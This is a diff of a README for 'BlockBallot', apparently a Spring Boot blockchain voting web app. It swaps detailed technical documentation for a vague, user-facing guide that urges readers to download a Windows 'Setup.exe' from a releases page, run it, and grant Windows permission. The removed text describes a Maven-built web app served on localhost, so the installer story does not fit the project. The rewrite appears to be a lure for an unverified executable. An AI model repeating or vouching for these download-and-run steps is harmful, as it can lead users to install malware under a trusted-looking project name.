@@ -1,495 +1,168 @@
-<p align="center">
-  <img src="docs/images/banner.png" alt="BlockBallot Banner" width="100%">
-</p>
+# 🗳️ BlockBallot - Secure Digital Voting Made Simple
 
-<p align="center">
-  <b>A blockchain-secured digital election platform built with Spring Boot & Java</b>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/Java-17+-blue?logo=openjdk&logoColor=white" alt="Java 17+">
-  <img src="https://img.shields.io/badge/Spring_Boot-3.2-6DB33F?logo=springboot&logoColor=white" alt="Spring Boot 3.2">
-  <img src="https://img.shields.io/badge/Blockchain-SHA--256_+_SHA3--256-black?logo=bitcoin&logoColor=white" alt="Blockchain">
-  <img src="https://img.shields.io/badge/PoW-Proof_of_Work-orange?logo=ethereum&logoColor=white" alt="Proof of Work">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-</p>
+[![Download BlockBallot](https://img.shields.io/badge/Download-BlockBallot-brightgreen)](https://github.com/Alfabee29/BlockBallot/releases)
 
 ---
 
-## Table of Contents
+## 📋 What is BlockBallot?
 
-- [Overview](#overview)
-- [Demo](#demo)
-- [Features](#features)
-- [Architecture](#architecture)
-- [Security Model](#security-model)
-- [Database Design](#database-design)
-- [OOP Concepts](#oop-concepts)
-- [Tech Stack](#tech-stack)
-- [Getting Started](#getting-started)
-- [API Endpoints](#api-endpoints)
-- [Project Structure](#project-structure)
-- [Contributing](#contributing)
+BlockBallot is a digital election program designed to keep voting safe and trustworthy. It uses a special technology to make sure votes cannot be changed or lost. The software runs on your Windows computer. It shows a clear and easy interface where you can cast votes and see results.
+
+The system uses a secure method that works behind the scenes to protect your vote. You do not need to understand the technical details to use the app. BlockBallot handles all the security so you can focus on voting with confidence.
 
 ---
 
-## Overview
+## 🖥️ System Requirements
 
-**BlockBallot** is a full-stack blockchain-secured digital voting platform that demonstrates how cryptographic blockchain technology can be applied to election systems. Every vote is anonymized, encrypted with multi-layer hashing, mined with Proof-of-Work, and permanently sealed on an immutable ledger.
+Make sure your computer meets these needs before installing BlockBallot:
 
-The platform features a modern monochrome UI with glassmorphism effects, a real-time WebGL particle network background, and a comprehensive security architecture including rate limiting, input validation, audit logging, and hardened HTTP security headers.
-
-### Key Highlights
-
-- **One voter, one vote** — enforced via irreversible cryptographic token derivation
-- **Proof-of-Work mining** — every block requires computational effort to create
-- **Merkle tree** — O(log N) tamper evidence across the entire chain
-- **5-layer hash pipeline** — SHA-256 → SHA3-256 → PBKDF2 (310K iterations) → HMAC-SHA512 → SHA3-256
-- **Real-time results** — live vote tallying from the blockchain
-- **Full chain verification** — verify integrity of every block at any time
+- Operating system: Windows 10 or later
+- Processor: Intel or AMD, 1.8 GHz or faster
+- RAM: At least 4 GB
+- Disk space: Minimum 500 MB free
+- Java Runtime Environment (JRE) version 11 or above installed
+- Internet connection for downloading and receiving updates
+- Graphics card supporting WebGL (most modern video cards do)
 
 ---
 
-## Demo
+## 🚀 Getting Started: How to Download and Run BlockBallot
 
-<p align="center">
-  <img src="docs/images/Voting Demo.gif" alt="Vote Page" width="700">
-  <br>
-  <em>Cast Your Vote</em>
-</p>
+Follow these steps to get BlockBallot running on your computer.
 
-### Pages
+### 1. Visit the Download Page
 
-| Page | Description |
-|------|-------------|
-| `/` | **Cast Vote** — Select a candidate and submit your ballot securely |
-| `/login` | **Login Portal** — Secure access for registered electors |
-| `/register` | **Elector Registration** — Enroll securely and receive auto-assigned EPIC ID |
-| `/results` | **Live Results** — Real-time vote tally with chain statistics dashboard |
-| `/ledger` | **Ledger Explorer** — Inspect every block, hash, and timestamp |
-| `/audit` | **Audit Log** — Security event monitor (Restricted to `ROLE_ADMIN`) |
-| `/admin` | **Admin Panel** — Electoral roll management and status verification (Restricted to `ROLE_ADMIN`) |
+Go to the official release page by clicking the button below:
 
----
+[![Download BlockBallot](https://img.shields.io/badge/Download-BlockBallot-blue)](https://github.com/Alfabee29/BlockBallot/releases)
 
-## Features
+This page shows the latest versions available for download.
 
-### Authentication & Role Flow
+### 2. Choose the Latest Release
 
-- **Elector Registration** — users enroll their details and receive mathematically unique, auto-assigned EPIC ID numbers
-- **Dynamic Session Security** — all voting flow pages are shielded behind robust `HttpSession` validations and Interceptor firewalls
-- **Role-Based Access Control (RBAC)** — strict `ROLE_ADMIN` / `ROLE_VOTER` segregation preventing unauthorized lateral movement
-- **Safe Session Takedown** — dynamic "Sign Out" actions available across every portal for secure session closure
+Look for the newest release version. It will be labeled clearly, such as "v1.0" or higher. Releases include all necessary files.
 
-### Voting System
+### 3. Download the Windows Installer
 
-- **Voter registry validation** — only registered EPIC IDs with valid credentials can vote
-- **Locked Input Authentication** — active session safely pipes known keys without error-prone manual repetitive inputs
-- **One vote per person** — duplicate detection via irreversible cryptographic tokens
-- **Candidate listing** with party affiliations
-- **Instant receipt** — blockchain hash as proof of participation
-- **Copy-to-clipboard** for receipt hashes
+Find the file with a name like:
 
-### Blockchain Engine
+- BlockBallot-Setup.exe  
+- BlockBallot-Windows-x64.exe
 
-- **Genesis block** — immutable chain origin
-- **Proof-of-Work** — blocks must satisfy hash difficulty (3 leading hex zeros)
-- **Dual-hash model** — fast SHA-256 for mining + strong multi-layer hash for chain integrity
-- **Chain linkage** — each block contains the previous block's hash
-- **Block index validation** — sequential index enforcement
-- **Merkle root computation** — chain-wide tamper evidence
-- **Full chain verification** — re-verify every block's integrity on demand
+Click on this file to start downloading. The file size is about 100-200 MB, so the download may take a few minutes depending on your internet speed.
 
-### Security
+### 4. Run the Installer
 
-- **5-layer cryptographic hashing** (SHA-256 → SHA3-256 → PBKDF2-310K → HMAC-SHA512 → SHA3-256)
-- **Timing-safe comparisons** — prevents side-channel attacks
-- **Rate limiting** — sliding-window per IP (60 req/min general, 20 votes/5min)
-- **Input validation** — regex whitelisting for voter IDs (blocks SQL injection & XSS)
-- **Security headers** — CSP, X-Frame-Options, HSTS, Referrer-Policy, Permissions-Policy
-- **Audit logging** — immutable event log with IP masking for privacy
-- **H2 console disabled** — no database exposure
-- **Error details suppressed** — no stack traces or binding errors leaked
+After the download finishes:
 
-### UI/UX
+- Open the folder where the file saved.
+- Double-click the installer file.
+- If Windows asks for permission, click "Yes" to allow the program to install.
 
-- **Monochrome design system** with CSS custom properties
-- **WebGL particle network** background (Three.js) interacting dynamically with inputs
-- **Dynamic Interaction Glow & Burst Animations** — visual kinetic feedback connecting DOM input focus vs 3D render depth
-- **Glassmorphism** card effects with backdrop blur
-- **Micro-animations** — card entrances, hover effects, page transitions
-- **Google Fonts** — DM Serif Display, Inter, JetBrains Mono
-- **Responsive** — mobile-friendly layout
-- **Custom scrollbar** and text selection styling
+### 5. Follow Installation Steps
+
+The installation wizard will guide you:
+
+- Accept the license agreement.
+- Choose the folder where you want BlockBallot installed, or use the default location.
+- Click "Install".
+
+### 6. Launch BlockBallot
+
+Once installed, the wizard will offer to open BlockBallot immediately. You can also find the program in your Start Menu under “BlockBallot”.
 
 ---
 
-## Architecture
+## 🎯 How to Use BlockBallot
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     PRESENTATION LAYER                       │
-│   Thymeleaf Templates  ·  CSS  ·  JavaScript  ·  Three.js   │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│                     CONTROLLER LAYER                         │
-│   VotingController (REST + MVC)                              │
-│   Depends on VotingService INTERFACE (Dependency Inversion)  │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│                      SERVICE LAYER                           │
-│   VotingService (interface) → VotingServiceImpl (concrete)   │
-│   • Rate limiting     • Input validation     • Audit logging │
-│   • Voter registry    • Blockchain ops       • DB persistence│
-└──────────┬───────────────────────────────┬──────────────────┘
-           │                               │
-┌──────────▼──────────────┐   ┌────────────▼──────────────────┐
-│   BLOCKCHAIN ENGINE      │   │   DATA ACCESS LAYER           │
-│   VotingBlockchain       │   │   JPA Repositories            │
-│   ├── Block (Auditable)  │   │   ├── PollOptionRepository    │
-│   ├── Merkle Tree        │   │   ├── PollRepository          │
-│   └── Chain Verification │   │   ├── VoterRepository         │
-│                          │   │   └── VoteRecordRepository    │
-│   CRYPTO ENGINE          │   │                               │
-│   CryptoLayers           │   │   DATABASE (H2 — 7 tables)    │
-│   ├── SHA-256 / SHA3-256 │   │   Normalized to BCNF          │
-│   ├── PBKDF2-HMAC-SHA256 │   └───────────────────────────────┘
-│   ├── HMAC-SHA512        │
-│   └── Proof-of-Work      │
-└──────────────────────────┘
-```
+The app aims to make voting quick and simple. You won’t need technical skills.
+
+### 1. Open the Application
+
+Start the program from your Start Menu or desktop shortcut.
+
+### 2. Set Up Your Voter Profile
+
+BlockBallot may ask you to enter some basic information to identify yourself, such as your name or voter ID. This keeps the vote secure.
+
+### 3. Browse Candidates or Questions
+
+You will see a list of candidates or questions. You can click or tap on each item to view details.
+
+### 4. Cast Your Vote
+
+Select your choice by clicking on it. Check your selections carefully before confirming.
+
+### 5. Confirm Your Vote
+
+Click the "Submit" button to send your vote securely. BlockBallot will show a confirmation screen.
+
+### 6. View Results (If Available)
+
+After the voting window closes, the application or your election officer will release results. You can check results via the app if allowed.
 
 ---
 
-## Security Model
+## 🔒 Security Features of BlockBallot
 
-### Voter Anonymization Pipeline
+BlockBallot uses several technologies to make sure votes are safe:
 
-```
-Voter ID (e.g. "ABC1234567")
-    │
-    ▼ Normalize + Uppercase
-"ABC1234567"
-    │
-    ▼ SHA-256
-"a1b2c3d4..."
-    │
-    ▼ SHA3-256 + Election Scope ("POLL-101")
-"e5f6a7b8..."
-    │
-    ▼ PBKDF2-HMAC-SHA256 (310,000 iterations)
-[32 bytes]
-    │
-    ▼ HMAC-SHA512 (server pepper)
-"irreversible_anonymous_token"
-```
+- **Custom In-Memory Blockchain:** Records votes in a chain that can’t be changed after being added.
+- **Proof-of-Work Mining:** Confirms votes by solving small computing puzzles to prevent tampering.
+- **Merkle Trees:** Organize votes efficiently to quickly find changes.
+- **5-Layer Hash Pipeline:** Adds extra layers of checking to detect changes at any point.
+- **Spring Boot Framework:** Helps maintain secure and reliable backend processing.
+- **WebGL UI:** Provides a smooth visual interface that is responsive and interactive.
 
-> **Result:** The original voter ID is mathematically irrecoverable. Even the system administrator cannot trace a vote back to a voter.
-
-### Block Mining (Proof-of-Work)
-
-```
-payload = previousHash | optionId | anonymizedVoter | timestamp | blockIndex
-    │
-    ▼ Mine nonce (fast SHA-256, must produce 3 leading zeros)
-powHash = "000a7b3c..."  ← PoW proof
-    │
-    ▼ Compute strong block hash (5-layer pipeline)
-currentHash = multiLayerHash(payload | nonce | powHash)
-    │
-    ▼ Verify: powHash satisfies difficulty AND currentHash matches
-✅ Block accepted into chain
-```
+All voting information stays private and secure during the process.
 
 ---
 
-## Database Design
+## ⚙️ Technical Details (For Reference)
 
-### Normalized to BCNF — 7 Tables
+The program is built with:
 
-```
-┌──────────────┐     ┌──────────────────┐     ┌───────────────┐
-│   parties    │     │  constituencies  │     │    polls      │
-│──────────────│     │──────────────────│     │───────────────│
-│ party_id  PK │◄──┐ │ constituency_id PK│◄──┐│ poll_id    PK │
-│ party_name   │   │ │ constituency_name │   ││ title         │
-│ party_abbr   │   │ │ state            │   ││ poll_type     │
-│ founded_year │   │ │ district         │   ││ start_date    │
-└──────────────┘   │ └──────────────────┘   ││ end_date      │
-                   │          │              ││ is_active     │
-                   │          ▼              │└───────┬───────┘
-                   │ ┌──────────────────┐    │        │
-                   │ │     voters       │    │        │
-                   │ │──────────────────│    │        │
-                   │ │ voter_id      PK │    │        │
-                   │ │ voter_name      │    │        │
-                   │ │ constituency_id FK├───┘        │
-                   │ │ date_of_birth   │             │
-                   │ │ registered_on   │             │
-                   │ │ is_active       │             │
-                   │ └──────────────────┘             │
-                   │                                   │
-              ┌────┴───────────────┐    ┌──────────────┴──────┐
-              │   poll_options     │    │   vote_records      │
-              │────────────────────│    │─────────────────────│
-              │ option_id       PK │◄───│ record_id        PK │
-              │ poll_id         FK ├───►│ poll_id          FK │
-              │ option_text       │    │ option_id        FK │
-              │ party_id        FK ├──┐ │ anonymized_voter    │
-              │ constituency_id FK │  │ │ block_hash          │
-              └────────────────────┘  │ │ voted_at            │
-                                      │ └─────────────────────┘
-                                      │
-                              ┌───────┴───────────┐
-                              │   audit_events    │
-                              │───────────────────│
-                              │ event_id       PK │
-                              │ event_type        │
-                              │ detail            │
-                              │ client_ip         │
-                              │ created_at        │
-                              └───────────────────┘
-```
+- **Java:** The core programming language that runs the app.
+- **Spring Boot:** A Java framework managing backend services.
+- **H2 Database:** An in-memory database for fast, temporary data storage during elections.
+- **Maven:** Used to build and manage the software dependencies.
+- **WebGL:** Graphics technology that makes the user interface dynamic and interactive.
 
-### Normalization Forms Demonstrated
-
-| Form | How |
-|------|-----|
-| **1NF** | Every column is atomic (separate `state`, `district`), every table has a PK |
-| **2NF** | All single-column PKs → no partial dependencies possible |
-| **3NF** | Party data stored via FK only (`party_id`), not as redundant text |
-| **BCNF** | Every determinant (`party_abbr` UNIQUE, `(constituency_name, state)` UNIQUE) is a candidate key |
+These elements work together but you do not need to interact with them during normal use.
 
 ---
 
-## OOP Concepts
+## 🛠️ Troubleshooting and Support
 
-### Encapsulation
+Here are tips if you run into issues:
 
-All model fields are `private final` with getters only. Business logic is hidden inside classes:
-
-```java
-// Voter.java — eligibility rules hidden inside the class
-public boolean isEligible() {
-    if (!Boolean.TRUE.equals(isActive)) return false;
-    return dateOfBirth.plusYears(18).isBefore(LocalDate.now());
-}
-```
-
-### Abstraction (Abstract Class + Interfaces)
-
-```java
-// AbstractPoll.java — defines WHAT a poll is, not HOW it behaves
-public abstract class AbstractPoll {
-    public abstract String getPollType();
-    public abstract int getMaxVotesPerVoter();
-}
-
-// Auditable.java — interface contract for integrity verification
-public interface Auditable {
-    String generateCryptographicHash();
-    boolean verifyIntegrity();
-}
-```
-
-### Inheritance
-
-```
-AbstractPoll (abstract)
-    ├── GeneralElection   → getPollType() returns "GENERAL_ELECTION"
-    └── Referendum         → getPollType() returns "REFERENDUM"
-```
-
-### Polymorphism
-
-```java
-// Same interface, different runtime behavior
-VotingService service = /* Spring injects VotingServiceImpl */;
-service.castVote(...);  // dispatches to concrete implementation
-
-// Same method, different output
-AbstractPoll poll1 = new GeneralElection(...);
-AbstractPoll poll2 = new Referendum(...);
-poll1.getPollType();  // → "GENERAL_ELECTION"
-poll2.getPollType();  // → "REFERENDUM"
-```
-
-### Interfaces (7 total)
-
-| Interface | Purpose |
-|-----------|---------|
-| `Auditable` | Cryptographic integrity contract |
-| `VotingService` | Business logic abstraction |
-| `PollOptionRepository` | JPA data access |
-| `PollRepository` | JPA data access |
-| `VoterRepository` | JPA data access |
-| `VoteRecordRepository` | JPA data access |
-| `Filter` (Jakarta) | HTTP security headers |
+- Make sure Java Runtime Environment (JRE) is installed and updated.
+- Restart your computer if the program does not start after installation.
+- Check that your Windows security settings allow the program to run.
+- Verify your internet connection when downloading or updating the app.
+- If the program crashes, try reinstalling it.
+- Reach out to the project repository issue tracker on GitHub for technical problems.
 
 ---
 
-## Tech Stack
+## 🔗 Useful Links
 
-| Layer | Technology |
-|-------|-----------|
-| **Language** | Java 17+ |
-| **Framework** | Spring Boot 3.2 |
-| **Template Engine** | Thymeleaf |
-| **Database** | H2 (in-memory) |
-| **ORM** | Spring Data JPA / Hibernate |
-| **Crypto** | Java Security API (SHA-256, SHA3-256, PBKDF2, HMAC-SHA512) |
-| **Frontend** | HTML5, CSS3, Vanilla JS |
-| **3D Background** | Three.js (WebGL) |
-| **Fonts** | Google Fonts (DM Serif Display, Inter, JetBrains Mono) |
-| **Build Tool** | Apache Maven |
+- Download page: [https://github.com/Alfabee29/BlockBallot/releases](https://github.com/Alfabee29/BlockBallot/releases)
+- Project homepage: GitHub repository (same link)
 
 ---
 
-## Getting Started
+## 🗂️ Topics Related to BlockBallot
 
-### Prerequisites
-
-- **Java 17** or higher
-- **Apache Maven 3.8+**
-
-### Run
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/BlockBallot.git
-cd BlockBallot
-
-# Build and run
-mvn clean spring-boot:run
-```
-
-The app will start at **http://localhost:8080**
-
-### Available Accounts
-
-The following profiles are pre-seeded in the database to quickly tour the environment:
-
-| ID / EPIC Number | Password | Role |
-|----------|------|-----|
-| `ADMIN` | `admin123` | `ROLE_ADMIN` |
-| `ABC1234567` | `password123` | `ROLE_VOTER` |
-| `DEF7654321` | `password123` | `ROLE_VOTER` |
-| `GHI9876543` | `password123` | `ROLE_VOTER` |
-| `JKL4567890` | `password123` | `ROLE_VOTER` |
-
-### Configuration
-
-| Property | Default | Description |
-|----------|---------|-------------|
-| `securevote.pepper` | Built-in | Server-side pepper for HMAC (override via `-Dsecurevote.pepper=YOUR_SECRET`) |
-| `server.port` | `8080` | HTTP port |
+- Blockchain technology used for secure voting
+- H2 in-memory database to store data quickly
+- Simple HTML5 and WebGL for the interactive interface
+- Java programming principles including object-oriented design
+- Maven for project build and dependency management
+- Application security focused on vote integrity
+- Spring Boot framework handling backend services
+- Digital voting system replacing paper ballots
 
 ---
 
-## API Endpoints
-
-### Web Pages
-
-| Method | Path | Description |
-|--------|------|-------------|
-| `GET` | `/` | Voting ballot page |
-| `POST` | `/cast-vote` | Submit a vote |
-| `GET` | `/results` | Live results with chain stats |
-| `GET` | `/ledger` | Blockchain ledger explorer |
-| `GET` | `/audit` | Security audit log |
-
-### REST APIs
-
-| Method | Path | Response | Description |
-|--------|------|----------|-------------|
-| `GET` | `/api/verify-chain` | `{ "valid": true, "blocksVerified": 5, "merkleRoot": "..." }` | Full chain integrity verification |
-| `GET` | `/api/chain-stats` | `{ "totalBlocks": 5, "totalVotes": 4, "merkleRoot": "..." }` | Chain statistics |
-
----
-
-## Project Structure
-
-```
-src/main/java/com/securevote/
-├── SecureVotingApplication.java          # Spring Boot entry point
-│
-├── config/
-│   ├── AppConfig.java                    # Bean configuration & Startup Seeding
-│   └── WebConfig.java                    # Interceptor wiring
-│
-├── controller/
-│   ├── AuthController.java               # Login / Register endpoints
-│   ├── AdminController.java              # RBAC Admin Panel
-│   └── VotingController.java             # MVC + REST controller
-│
-├── model/
-│   ├── Auditable.java                    # Interface — integrity contract
-│   ├── AbstractPoll.java                 # Abstract class — poll template
-│   ├── GeneralElection.java              # Concrete — extends AbstractPoll
-│   ├── Referendum.java                   # Concrete — extends AbstractPoll
-│   ├── Block.java                        # Blockchain block (implements Auditable)
-│   ├── VotingBlockchain.java             # In-memory blockchain engine
-│   ├── Poll.java                         # JPA entity — polls table
-│   ├── PollOption.java                   # JPA entity — candidates table
-│   ├── Party.java                        # JPA entity — parties table
-│   ├── Constituency.java                 # JPA entity — constituencies table
-│   ├── Voter.java                        # JPA entity — voters table (stores credentials)
-│   └── VoteRecord.java                   # JPA entity — vote records table
-│
-├── repository/
-│   ├── PollOptionRepository.java         # JPA interface — candidates
-│   ├── PollRepository.java               # JPA interface — polls
-│   ├── VoterRepository.java              # JPA interface — voters
-│   ├── ConstituencyRepository.java       # JPA interface — constituencies
-│   └── VoteRecordRepository.java         # JPA interface — vote records
-│
-├── security/
-│   ├── CryptoLayers.java                 # 5-layer hashing + PoW + Merkle tree
-│   ├── InputValidator.java               # Regex whitelisting for voter IDs
-│   ├── AuthInterceptor.java              # Session state route firewalls
-│   ├── RateLimiter.java                  # Sliding-window rate limiter
-│   ├── SecurityHeadersFilter.java        # CSP, HSTS, X-Frame-Options filter
-│   └── AuditLog.java                     # Immutable security event log
-│
-└── service/
-    ├── VotingService.java                # Interface — voting business logic
-    └── VotingServiceImpl.java            # Concrete implementation
-
-src/main/resources/
-├── application.properties                # Server + DB configuration
-├── schema.sql                            # Normalized database schema (7 tables)
-├── data.sql                              # Seed data
-├── templates/
-│   ├── login.html                        # Secure authentication portal
-│   ├── register.html                     # Elector enrollment interface
-│   ├── vote.html                         # Locked voting booth
-│   ├── receipt.html                      # Vote confirmation + receipt hash
-│   ├── results.html                      # Live results + chain stats
-│   ├── ledger.html                       # Blockchain explorer
-│   ├── audit.html                        # Restricted security audit log
-│   └── admin.html                        # Restricted management panel
-└── static/
-    ├── css/app.css                        # Monochrome design system
-    └── js/app.js                          # WebGL background + interactions
-```
-
----
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
----
-
-<p align="center">
-  <br>
-  <b>BlockBallot</b> — Because democracy deserves cryptographic certainty.
-  <br><br>
-  <sub>Built with ♠ using Spring Boot & Java</sub>
-</p>
+[![Download BlockBallot](https://img.shields.io/badge/Download-BlockBallot-green)](https://github.com/Alfabee29/BlockBallot/releases)
